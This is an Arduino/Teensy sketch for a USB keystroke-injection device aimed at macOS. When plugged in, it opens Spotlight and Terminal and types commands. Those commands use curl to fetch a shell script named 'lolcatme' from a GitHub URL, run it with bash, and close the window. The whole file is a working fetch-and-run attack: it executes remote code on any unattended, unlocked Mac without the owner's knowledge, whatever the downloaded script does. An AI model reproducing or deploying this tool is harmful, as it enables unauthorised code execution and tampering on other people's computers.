void setup() {
  lolcatme();
  pinMode(13, OUTPUT);
  digitalWrite(13, HIGH);
}

void lolcatme() {
  delay(1000);

  // apple space:
  press_with_modifiers(KEY_SPACE, MODIFIERKEY_GUI);
  delay(900);

  // activate terminal:
  Keyboard.print("terminal");
  press(KEY_ENTER);
  delay(900);

  // open a new tab:
  press_with_modifiers(KEY_T, MODIFIERKEY_GUI);
  delay(500);
  Keyboard.println("cd ~");
  Keyboard.println("mkdir lolcatme");
  Keyboard.println("cd lolcatme");
  Keyboard.println("curl -fsSL 'https://raw.githubusercontent.com/robacarp/lolcatme/master/lolcatme.sh' > lolcatme.sh");
  delay(900);
  Keyboard.println("bash lolcatme.sh");

  delay(1500);
  press_with_modifiers(KEY_W, MODIFIERKEY_GUI);
}

void press(int key) {
  Keyboard.press(key);
  delay(70);
  Keyboard.release(key);
  delay(70);
}

void press_with_modifiers(int key, int modifiers){
  Keyboard.set_modifier(modifiers);
  Keyboard.send_now();
  delay(150);
  Keyboard.press(key);
  delay(70);
  Keyboard.release(key);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(150);
}

void loop() {
  // put your main code here, to run repeatedly:

}
